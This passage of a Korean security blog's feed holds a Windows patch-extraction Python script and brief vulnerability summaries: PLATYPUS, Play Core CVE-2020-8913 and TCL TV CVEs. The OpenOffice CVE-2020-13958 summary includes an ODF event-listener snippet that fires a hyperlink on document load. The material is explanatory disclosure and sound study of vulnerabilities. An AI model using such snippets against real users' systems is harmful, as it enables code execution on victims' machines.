&#xD45C;&#xC815;&#xC73C;&#xB85C; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; &#xC0B4;&#xD3B4;&#xBCF8; L0ch&#xC758; &#xD45C;&#xC815;&#xC774; &#xC5B4;&#xB450;&#xC6CC;&#xC9D1;&#xB2C8;&#xB2E4;. &#xBB34;&#xC2A8; &#xC77C;&#xC774;&#xC8E0;? &#xC544; ! &#xD30C;&#xC6CC;&#xC258;&#xB85C; &#xC9E0; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB124;&#xC694;!<br>&#xC800;&#xB7F0;&#x2026; &#xC560;&#xC11D;&#xD558;&#xAC8C;&#xB3C4; L0ch&#xB294; &#xD30C;&#xC6CC;&#xC258;&#xC744; &#xD574;&#xBCF8; &#xC801;&#xC774; &#xC5C6;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB208;&#xBB3C;&#xC744; &#xBA38;&#xAE08;&#xACE0; &#xD30C;&#xC774;&#xC36C;&#xC73C;&#xB85C; &#xC0C8;&#xB85C; &#xC791;&#xC131;&#xD558;&#xB294; &#xBC29;&#xBC95;&#xBC16;&#xC5D0; &#xC5C6;&#xACA0;&#xAD70;&#xC694;.</p></blockquote><pre><code class="hljs python"><span class="hljs-comment">#F**k PowerShell </span><span class="hljs-keyword">import</span> os<span class="hljs-keyword">import</span> subprocess<span class="hljs-keyword">import</span> timeps_path = <span class="hljs-string">&apos;C:/Windows/System32/WindowsPowerShell/v1.0/powershell.exe &apos;</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">create_dir</span>(<span class="hljs-params">dir</span>):</span><span class="hljs-keyword">try</span>:<span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span>(os.path.isdir(dir)):os.makedirs(os.path.join(dir))<span class="hljs-keyword">except</span> OSError <span class="hljs-keyword">as</span> e:<span class="hljs-keyword">if</span> e.errno != errno.EEXIST:print(<span class="hljs-string">&quot;Failed to create directory&quot;</span>)<span class="hljs-keyword">raise</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">extract_msu</span>():</span>cmd = <span class="hljs-string">&apos;expand.exe -F:* &quot;*.msu&quot; ./ext/&apos;</span>subprocess.run(ps_path + cmd, shell=<span class="hljs-literal">True</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">extract_cab</span>():</span>cmd = <span class="hljs-string">&apos;expand.exe -F:* &quot;./ext/Windows*.cab&quot; ./patch/&apos;</span>subprocess.run(ps_path + cmd, shell=<span class="hljs-literal">True</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">move_files</span>(<span class="hljs-params">dir, filename</span>):</span><span class="hljs-keyword">try</span>:os.popen(<span class="hljs-string">&apos;move ./patch/&apos;</span>+filename+<span class="hljs-string">&apos; ./&apos;</span>+dir)<span class="hljs-keyword">except</span>:print(<span class="hljs-string">&quot;Failed to move file&quot;</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">classification</span>():</span>output = os.popen(<span class="hljs-string">&apos;dir /ad /b patch&apos;</span>).read()patch_list = output.split(<span class="hljs-string">&apos;\\n&apos;</span>)print(<span class="hljs-string">&quot;File classification&quot;</span>)<span class="hljs-keyword">for</span> idx, patch <span class="hljs-keyword">in</span> enumerate(patch_list):<span class="hljs-keyword">if</span> idx + <span class="hljs-number">1</span> % <span class="hljs-number">5</span> == <span class="hljs-number">0</span>:print(<span class="hljs-string">&quot;(&quot;</span>+str(idx)+<span class="hljs-string">&quot;/&quot;</span> + str(len(patch_list))+<span class="hljs-string">&quot;)&quot;</span>)time.sleep(<span class="hljs-number">0.01</span>)platform = patch[:<span class="hljs-number">5</span>]<span class="hljs-keyword">if</span> <span class="hljs-string">&apos;msil&apos;</span> <span class="hljs-keyword">in</span> platform:move_files(<span class="hljs-string">&apos;MSIL&apos;</span>, patch)<span class="hljs-keyword">elif</span> <span class="hljs-string">&apos;wow64&apos;</span> <span class="hljs-keyword">in</span> platform:move_files(<span class="hljs-string">&apos;WOW64&apos;</span>, patch)<span class="hljs-keyword">elif</span> <span class="hljs-string">&apos;amd64&apos;</span> <span class="hljs-keyword">in</span> platform:move_files(<span class="hljs-string">&apos;x64&apos;</span>, patch)<span class="hljs-keyword">elif</span> <span class="hljs-string">&apos;x86&apos;</span> <span class="hljs-keyword">in</span> platform:move_files(<span class="hljs-string">&apos;x86&apos;</span>, patch)print(<span class="hljs-string">&quot;(&quot;</span>+str(idx + <span class="hljs-number">1</span>)+<span class="hljs-string">&quot;/&quot;</span> + str(len(patch_list))+<span class="hljs-string">&quot;)&quot;</span>)<span class="hljs-comment"># JUNK</span>os.popen(<span class="hljs-string">&apos;move patch JUNK&apos;</span>)os.popen(<span class="hljs-string">&apos;cd ext &amp;&amp; move *.txt ../&apos;</span>)os.popen(<span class="hljs-string">&apos;echo y | rmdir /s ext &gt; nul&apos;</span>)<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:dir_list = [<span class="hljs-string">&apos;ext&apos;</span>,<span class="hljs-string">&apos;patch&apos;</span>,<span class="hljs-string">&apos;MSIL&apos;</span>,<span class="hljs-string">&apos;WOW64&apos;</span>,<span class="hljs-string">&apos;x64&apos;</span>,<span class="hljs-string">&apos;x86&apos;</span>]<span class="hljs-keyword">for</span> d <span class="hljs-keyword">in</span> dir_list:create_dir(d)extract_msu()extract_cab()classification()print(<span class="hljs-string">&quot;Done&quot;</span>)time.sleep(<span class="hljs-number">3</span>)</code></pre><p>PowerShell &#xC368;&#xBCF4;&#xB824;&#xACE0; &#xD588;&#xB294;&#xB370; 10&#xBD84;&#xB9CC;&#xC5D0; &#xB54C;&#xB824;&#xCE58;&#xACE0; &#xAC4D; &#xC775;&#xC219;&#xD55C; &#xD30C;&#xC774;&#xC36C; &#xC37C;&#xC2B5;&#xB2C8;&#xB2E4;&#x314B;&#x314B;. &#xC775;&#xC219;&#xD55C; &#xAC8C; &#xCD5C;&#xACE0;&#xC57C;</p><p><img src="/2020/11/15/l0ch/windows-patch-diffing-part1/11.png" alt></p><blockquote><p>&#xD30C;&#xC774;&#xC36C; &#xCD5C;&#xACE0;&#xB2E4;&#xC545;!! </p></blockquote><p><img src="/2020/11/15/l0ch/windows-patch-diffing-part1/12.png" alt></p><p>msu&#xC5D0;&#xC11C; cab&#xD30C;&#xC77C;&#xC744; &#xCD94;&#xCD9C;&#xD558;&#xACE0;, &#xC704; &#xC0AC;&#xC9C4;&#xACFC; &#xAC19;&#xC774; cab&#xC5D0;&#xC11C; &#xCD94;&#xCD9C;&#xD55C; &#xD30C;&#xC77C;&#xB4E4;&#xC744; &#xAC01; &#xC544;&#xD0A4;&#xD14D;&#xCC98; &#xD3F4;&#xB354;&#xC5D0; &#xBD84;&#xB958;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.<br>.manifest&#xC640; .mum, .cat &#xD30C;&#xC77C;&#xC740; &#xB4E4;&#xC5EC;&#xB2E4;&#xBCFC; &#xC77C;&#xC774; &#xAC70;&#xC758; &#xC5C6;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; JUNK&#xB85C; &#xBD84;&#xB958;&#xB97C; &#xD588;&#xAD6C;&#xC694;.</p><p>&#xC774;&#xB807;&#xAC8C; &#xBD84;&#xB958;&#xD574;&#xC11C; &#xC815;&#xB9AC;&#xB41C; &#xBAA8;&#xC2B5;&#xC744; &#xBCF4;&#xB2C8; &#xD3B8;&#xC548;&#xD558;&#xAD70;&#xC694;. &#xC5ED;&#xC2DC; &#xC0AC;&#xB78C;&#xC740; &#xC815;&#xB9AC;&#xB97C; &#xD558;&#xACE0; &#xC0B4;&#xC544;&#xC57C; &#xB3FC;<br>&#xC544; &#xADF8;&#xB798;&#xC11C; &#xC81C; &#xBC29;&#xC740; &#xC815;&#xB9AC;&#xD558;&#xACE0; &#xC0AC;&#xB0D0;&#xAD6C;&#xC694;? &#xADF8;&#xB7F4; &#xB9AC;&#xAC00;&#xC694;..?</p><p>&#xBD84;&#xB7C9; &#xC870;&#xC808; &#xC2E4;&#xD328;&#xB85C;.. &#xB2E4;&#xC74C; &#xAE00;&#xC5D0;&#xC11C;&#xB294; &#xD328;&#xCE58; &#xC720;&#xD615;&#xC744; &#xC54C;&#xC544;&#xBCF4;&#xACE0;, &#xBCF8;&#xACA9;&#xC801;&#xC73C;&#xB85C; Diffing&#xC744; &#xD574;&#xBCFC;&#xAC8C;&#xC694;!</p><p><img src="/2020/11/15/l0ch/windows-patch-diffing-part1/13.jpg" alt></p><p>&#xC548;&#xB155;&#xD788; &#xACC4;&#xC138;&#xC694; &#xC5EC;&#xB7EC;&#xBD84;! &#xC804; &#xC774; &#xC138;&#xC0C1;&#xC758; &#xBAA8;&#xB4E0; &#xAD74;&#xB808;&#xC640; &#xC18D;&#xBC15;&#xC744; &#xBC97;&#xC5B4; &#xB358;&#xC9C0;&#xACE0; &#xC81C; &#xD589;&#xBCF5;&#xC744; &#xCC3E;&#xC544; &#xB5A0;&#xB0A9;&#xB2C8;&#xB2E4;! (&#xB300;&#xCDA9; &#xC220; &#xBA39;&#xC73C;&#xB7EC; &#xAC04;&#xB2E4;&#xB294; &#xB9D0;)</p>]]></content>
    
    
    <categories>
      
      <category>Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows</tag>
      
      <tag>L0ch</tag>
      
      <tag>diffing</tag>
      
      <tag>patch tuesday</tag>
      
      <tag>patch extract</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Software-based Power Side-Channel Attack on x86</title>
    <link href="/2020/11/14/fabu1ous/2020-11-14/"/>
    <url>/2020/11/14/fabu1ous/2020-11-14/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://platypusattack.com/">PLATYPUS</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Xen</p><p>Intel Processor &#xB2E4;&#xC218;</p><p>Linux</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>side-channel &#xC815;&#xBCF4;(power consumption / electro magnetic emission)&#xB97C; &#xC774;&#xC6A9;&#xD574; &#xC2DC;&#xC2A4;&#xD15C;&#xC758; operation &#xBC0F; data&#xB97C; &#xC720;&#xCD94;&#xD558;&#xB294; &#xACF5;&#xACA9; &#xBC29;&#xBC95;&#xC740; &#xC138;&#xACC4; 2&#xCC28; &#xB300;&#xC804; &#xB54C;&#xBD80;&#xD130; &#xC874;&#xC7AC;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC9C0;&#xAE08;&#xAE4C;&#xC9C0; 2&#xAC00;&#xC9C0; &#xD55C;&#xACC4;&#xAC00; &#xC874;&#xC7AC;&#xD588;&#xB294;&#xB370; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li>&#xACE0;&#xC131;&#xB2A5;&#xC758; Desktop&#xC774;&#xB098; server&#xC6A9; CPU &#xBCF4;&#xB2E8; &#xC784;&#xBCA0;&#xB514;&#xB4DC; &#xB9C8;&#xC774;&#xD06C;&#xB85C; &#xCEE8;&#xD2B8;&#xB864;&#xB7EC;&#xB97C; &#xD0C0;&#xAC9F;&#xC73C;&#xB85C; &#xC7A1;&#xC74C;.</li><li>&#xC624;&#xC2E4;&#xB85C;&#xC2A4;&#xCF54;&#xD504; &#xB4F1;&#xC744; &#xC774;&#xC6A9;&#xD55C; &#xD558;&#xB4DC;&#xC6E8;&#xC5B4; &#xAE30;&#xBC18; &#xACF5;&#xACA9;&#xC774; &#xB9CE;&#xC558;&#xACE0;, &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4; &#xAE30;&#xBC18; &#xACF5;&#xACA9;&#xC758; x86 &#xC801;&#xC6A9;&#xC740; &#xD06C;&#xAC8C; &#xC131;&#xACF5;&#xC801;&#xC774;&#xC9C0; &#xBABB;&#xD568;. ex) RSA key &#xBCF5;&#xAD6C; &#xC2DC;&#xB3C4;&#xAC00; 2&#xBC88; &#xC788;&#xC5C8;&#xC9C0;&#xB9CC; &#xC2E4;&#xD328;.</li></ol><p>PLATYPUS attack&#xC740; &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4; &#xAE30;&#xBC18; side-channel &#xACF5;&#xACA9;&#xC785;&#xB2C8;&#xB2E4;. Intel RAPL interface&#xC5D0; &#xC811;&#xADFC;&#xD574; power consumption&#xC5D0; &#xB300;&#xD55C; &#xC815;&#xBCF4; &#xCD95;&#xC801; &#xD6C4; x86 &#xC2DC;&#xC2A4;&#xD15C;&#xC744; &#xD0C0;&#xAC9F;&#xC73C;&#xB85C; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; &#xD589;&#xC704;&#xB97C; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li>instruction &#xBD84;&#xBCC4;, control flow monitoring</li><li>AES-NI key &#xCD94;&#xCD9C;(26&#xC2DC;&#xAC04; &#xC774;&#xB0B4;)</li><li>RSA key &#xBCF5;&#xAD6C;(100&#xBD84; &#xC774;&#xB0B4;)</li><li>KASLR &#xBB34;&#xB825;&#xD654;(20&#xCD08; &#xC774;&#xB0B4;)</li></ol><p>Intel RAPL(Running Average Power Limit)&#xC758; &#xB370;&#xC774;&#xD130;&#xC5D0; &#xB204;&#xAD6C;&#xB098; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC788;&#xACE0; &#xC545;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; power monitoring interface&#xB4E4;&#xC758; &#xC811;&#xADFC;&#xAD8C;&#xD55C;&#xC774; &#xD328;&#xCE58;&#xB410;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://seclists.org/oss-sec/2020/q4/109">https://seclists.org/oss-sec/2020/q4/109</a></p><p><a href="https://seclists.org/oss-sec/2020/q4/110">https://seclists.org/oss-sec/2020/q4/110</a></p><p><a href="https://www.intel.com/content/www/us/en/security-center/advisory/intel-sa-00389.html">https://www.intel.com/content/www/us/en/security-center/advisory/intel-sa-00389.html</a></p><p><a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=949dd0104c496fa7c14991a23c03c62e44637e71">https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=949dd0104c496fa7c14991a23c03c62e44637e71</a></p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>linux</tag>
      
      <tag>Fabu1ous</tag>
      
      <tag>side-channel attack</tag>
      
      <tag>intel</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Persistent arbitrary code execution in Android&#39;s Google Play Core Library</title>
    <link href="/2020/11/13/l0ch/2020-11-13/"/>
    <url>/2020/11/13/l0ch/2020-11-13/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://hackerone.com/reports/971386">CVE-2020-8913 - Persistent arbitrary code execution in Android&#x2019;s Google Play Core Library</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Android Play Core &#x2264; 1.7.2</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Google API&#xB97C; &#xD1B5;&#xD574; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; Play Store&#xC5D0; &#xC811;&#xADFC;&#xD558;&#xC9C0; &#xC54A;&#xACE0; &#xC778;&#xC571; &#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xB97C; &#xD560; &#xC218; &#xC788;&#xAC8C; &#xD574;&#xC8FC;&#xB294; Play Core Library&#xC5D0;&#xC11C; &#xC784;&#xC758; &#xCF54;&#xB4DC; &#xC2E4;&#xD589;&#xC774; &#xAC00;&#xB2A5;&#xD55C; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC545;&#xC6A9;&#xD558;&#xBA74; Play Core Library&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xBAA8;&#xB4E0; &#xC548;&#xB4DC;&#xB85C;&#xC774;&#xB4DC; &#xC571;&#xC744; &#xB300;&#xC0C1;&#xC73C;&#xB85C; &#xC784;&#xC758; &#xCF54;&#xB4DC; &#xC2E4;&#xD589;&#xC744; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xCDE8;&#xC57D;&#xC810;&#xC774; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xBD80;&#xBD84;&#xC740; <code>SplitCompat.install</code> &#xB85C;, &#xB3D9;&#xC77C;&#xD55C; &#xAE30;&#xAE30;&#xC5D0; &#xC124;&#xCE58;&#xB41C; &#xD0C0;&#xC0AC; &#xC571;&#xC774; &#xC784;&#xC758;&#xC758; &#xB370;&#xC774;&#xD130;&#xB97C; broadcast &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; &#xACFC;&#xC815;&#xC5D0;&#xC11C; <code>split_id</code> &#xC5D0; &#xB300;&#xD55C; &#xC720;&#xD6A8;&#xC131; &#xAC80;&#xC0AC;&#xAC00; &#xC5C6;&#xC5B4; path traversal&#xB97C; &#xD1B5;&#xD574; &#xC6D0;&#xD558;&#xB294; &#xC704;&#xCE58;&#xC5D0; &#xC784;&#xC758;&#xC758; &#xD30C;&#xC77C;&#xC744; &#xBCF5;&#xC0AC;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB54C; &#xC784;&#xC758; &#xCF54;&#xB4DC;&#xB97C; &#xD3EC;&#xD568;&#xD558;&#xACE0; &#xD30C;&#xC77C;&#xBA85;&#xC774;  <code>config.</code> &#xB85C; &#xC2DC;&#xC791;&#xD558;&#xB294; &#xD30C;&#xC77C;&#xC744;  <code>verified-splits</code> &#xACBD;&#xB85C;&#xC5D0; &#xBCF5;&#xC0AC;&#xD558;&#xBA74;  &#xD30C;&#xC77C;&#xC774; &#xC571;&#xC758; &#xB7F0;&#xD0C0;&#xC784; ClassLoader&#xC5D0; &#xCD94;&#xAC00;&#xB418;&#xC5B4; &#xD574;&#xB2F9; &#xC571;&#xC5D0;&#xC11C; &#xC784;&#xC758; &#xCF54;&#xB4DC;&#xAC00; &#xC2E4;&#xD589;&#xB429;&#xB2C8;&#xB2E4;. </p><p>&#xACF5;&#xACA9;&#xC790;&#xB294; Play Core Library&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xC571;&#xC744; &#xD0C0;&#xAC9F;&#xC73C;&#xB85C; &#xD558;&#xB294; &#xC545;&#xC131; APK&#xB97C; &#xC81C;&#xC791;&#xD558;&#xACE0;, &#xD53C;&#xD574;&#xC790;&#xAC00; &#xC774;&#xB97C; &#xC124;&#xCE58;&#xD558;&#xB3C4;&#xB85D; &#xC720;&#xB3C4;&#xD574; &#xD53C;&#xD574;&#xC790;&#xC758; &#xB370;&#xC774;&#xD130;&#xB97C; &#xD0C8;&#xCDE8;&#xD558;&#xAC70;&#xB098; &#xCF54;&#xB4DC; &#xC2E4;&#xD589;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC740; Google Chrome&#xC744; &#xBE44;&#xB86F;&#xD55C; &#xC778;&#xAE30; &#xC571;&#xC5D0;&#xC11C; &#xC784;&#xC758; &#xCF54;&#xB4DC; &#xC2E4;&#xD589;&#xC774; &#xAC00;&#xB2A5;&#xD558;&#xB2E4;&#xB294; &#xC810;&#xC5D0;&#xC11C; &#xC2EC;&#xAC01;&#xD55C; &#xCDE8;&#xC57D;&#xC810;&#xC73C;&#xB85C; &#xBD84;&#xB958;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>android</tag>
      
      <tag>arbitrary code execution</tag>
      
      <tag>google</tag>
      
      <tag>L0ch</tag>
      
      <tag>play core library</tag>
      
      <tag>path traversal</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-13958: Apache OpenOffice RCE</title>
    <link href="/2020/11/12/idioth/2020-11-12/"/>
    <url>/2020/11/12/idioth/2020-11-12/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://github.com/irsl/apache-openoffice-rce-via-uno-links">Apache OpenOffice RCE (CVE-2020-13958)</a></p><p><a href="https://github.com/irsl/apache-openoffice-rce-via-uno-links/blob/master/job-offer-CONFIDENTIAL.odt">PoC File</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Apache OpenOffice 4.0.0 ~ 4.1.7</li><li>Maybe OpenOffice.org versions</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Apache OpenOffice 4&#xC5D0;&#xC11C; &#xC6D0;&#xACA9; &#xCF54;&#xB4DC; &#xC2E4;&#xD589; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; LibreOffice&#xC5D0;&#xC11C; &#xBC1C;&#xACAC;&#xB41C; CVE-2019-9847&#xACFC; &#xC720;&#xC0AC;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xD574;&#xB2F9; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC5D0;&#xC11C; <code>script:event-listener</code> &#xD578;&#xB4E4;&#xB7EC;&#xB97C; &#xB9E4;&#xD06C;&#xB85C; &#xC2E4;&#xD589;&#xC73C;&#xB85C; &#xCC98;&#xB9AC;&#xD558;&#xC9C0; &#xC54A;&#xC544;&#xC11C; &#xBC1C;&#xC0DD;&#xD55C; &#xCDE8;&#xC57D;&#xC810;&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB85C; &#xAD6C;&#xC131;&#xD558;&#xC5EC; OpenOffice&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; <code>.uno &#xD639;&#xC740; .service</code>&#xB97C; &#xD1B5;&#xD574; &#xD655;&#xC778;&#xCC3D;&#xC774;&#xB098; &#xD074;&#xB9AD; &#xC720;&#xB3C4; &#xC5C6;&#xC774; &#xD558;&#xC774;&#xD37C; &#xB9C1;&#xD06C;&#xB97C; &#xD1B5;&#xD574; URL&#xC744; &#xC5F4; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs vim">&lt;office:scripts&gt;   &lt;office:event-listeners&gt;    &lt;<span class="hljs-keyword">scrip</span><span class="hljs-variable">t:event</span>-listener <span class="hljs-keyword">scrip</span><span class="hljs-variable">t:language</span>=<span class="hljs-string">&quot;ooo:script&quot;</span>xlink:href=<span class="hljs-string">&quot;.uno:OpenHyperlinkOnCursor&quot;</span> <span class="hljs-keyword">scrip</span><span class="hljs-variable">t:event</span>-name=<span class="hljs-string">&quot;dom:load&quot;</span>/&gt;   &lt;/office:event-listeners&gt;&lt;/office:scripts&gt;</code></pre><p><code>.uno .service</code>&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xD2B8;&#xB9AC;&#xAC70;&#xD558;&#xB294; &#xAC83;&#xC740; &#xB9AC;&#xB205;&#xC2A4;&#xC5D0;&#xC11C;&#xB3C4; &#xB3D9;&#xC791;&#xD558;&#xC9C0;&#xB9CC; code execution&#xC73C;&#xB85C; &#xC774;&#xC5B4;&#xC9C8;&#xB9CC;&#xD55C; &#xAC83;&#xC744; &#xCC3E;&#xC9C0; &#xBABB;&#xD588;&#xB2E4;&#xACE0; &#xD569;&#xB2C8;&#xB2E4;.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://www.libreoffice.org/about-us/security/advisories/cve-2019-9847/">https://www.libreoffice.org/about-us/security/advisories/cve-2019-9847/</a></p><p><a href="https://nvd.nist.gov/vuln/detail/CVE-2019-9847">https://nvd.nist.gov/vuln/detail/CVE-2019-9847</a></p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>rce</tag>
      
      <tag>idioth</tag>
      
      <tag>openoffice</tag>
      
      <tag>libreoffice</tag>
      
      <tag>arbitrary code execution</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Two CVEs on TCL Android TVs</title>
    <link href="/2020/11/11/fabu1ous/2020-11-11/"/>
    <url>/2020/11/11/fabu1ous/2020-11-11/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://sick.codes/extraordinary-vulnerabilities-discovered-in-tcl-android-tvs-now-worlds-3rd-largest-tv-manufacturer/">Extraordinary Vulnerabilities Discovered in TCL Android TVs</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>TCL android TV </p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>TCL android TV&#xC5D0; &#xB300;&#xD55C; CVE&#xBC88;&#xD638;&#xAC00; 2&#xAC1C; &#xBC1C;&#xAE09;&#xB410;&#xC2B5;&#xB2C8;&#xB2E4;. TCL&#xC740; &#xC911;&#xAD6D; &#xC804;&#xC790;&#xC81C;&#xD488; &#xD68C;&#xC0AC;&#xB85C; &#xD604;&#xC7AC; TV &#xC2DC;&#xC7A5;&#xC5D0;&#xC11C; 3&#xBC88;&#xC9F8;&#xB85C; &#xD070; &#xBE44;&#xC911;&#xC744; &#xCC28;&#xC9C0;&#xD558;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC81C;&#xBCF4;&#xD55C; Sick Codes&#xC640; John Jackson&#xC740; &#xC81C;&#xC870;&#xC0AC;&#xC758; &#xC758;&#xB3C4;&#xAC00; &#xC758;&#xC2EC;&#xC2A4;&#xB7FD;&#xB2E4;&#xB294; &#xB9D0;&#xC744; &#xC870;&#xC2EC;&#xC2A4;&#xB7FD;&#xAC8C; &#xD558;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. </p><ul><li>CVE-2020-27403 : TV&#xC758; 7989&#xBC88; &#xD3EC;&#xD2B8;&#xC5D0; &#xC6F9;&#xC11C;&#xBC84;&#xAC00; &#xB3D9;&#xC791;&#xD558;&#xACE0; &#xC788;&#xC73C;&#xBA70;,  &#xB2E8;&#xC21C;&#xD788; &#xC774;&#xACF3;&#xC5D0; &#xC811;&#xC18D;&#xD558;&#xB294; &#xAC83; &#xB9CC;&#xC73C;&#xB85C; &#xBAA8;&#xB4E0; file system&#xC5D0; &#xC811;&#xADFC;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</li><li>CVE-2020-28055 : &#xC545;&#xC131; apk &#xB4F1;&#xC758; local unprivileged attacker&#xAC00; critical &#xD55C; &#xC2DC;&#xC2A4;&#xD15C; &#xB9AC;&#xC18C;&#xC2A4;&#xC5D0; &#xC77D;&#xAE30; &#xBC0F; &#xC4F0;&#xAE30;&#xAC00; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</li></ul><p>7989&#xBC88; &#xD3EC;&#xD2B8;&#xB294; unassigned port&#xC785;&#xB2C8;&#xB2E4;. &#xC989;, &#xD2B9;&#xC815;&#xD55C; &#xBAA9;&#xC801;&#xC774; &#xBD80;&#xC5EC;&#xB41C; &#xBC88;&#xD638;&#xAC00; &#xC544;&#xB2C8;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; 7989&#xBC88; &#xD3EC;&#xD2B8;&#xC5D0; http&#xB85C; file system&#xC744; &#xB0B4;&#xBCF4;&#xB0BC; &#xC774;&#xC720;&#xAC00; &#xC5C6;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB610;&#xD55C; &#xC81C;&#xC870;&#xC0AC;&#xAC00; TV&#xC5D0; &#xB300;&#xD55C; &#xC644;&#xBCBD;&#xD55C; &#xC6D0;&#xACA9; &#xC81C;&#xC5B4;&#xAC00;  &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p><blockquote><p>Please make your own conclusions from our research.</p></blockquote><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://sick.codes/sick-2020-009">https://sick.codes/sick-2020-009</a></p><p><a href="https://sick.codes/sick-2020-012">https://sick.codes/sick-2020-012</a></p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>Fabu1ous</tag>
      
      <tag>android tv</tag>
      
      <tag>tcl</tag>
      
      <tag>tv</tag>
      
    </tags>
    
  </entry>
  
  
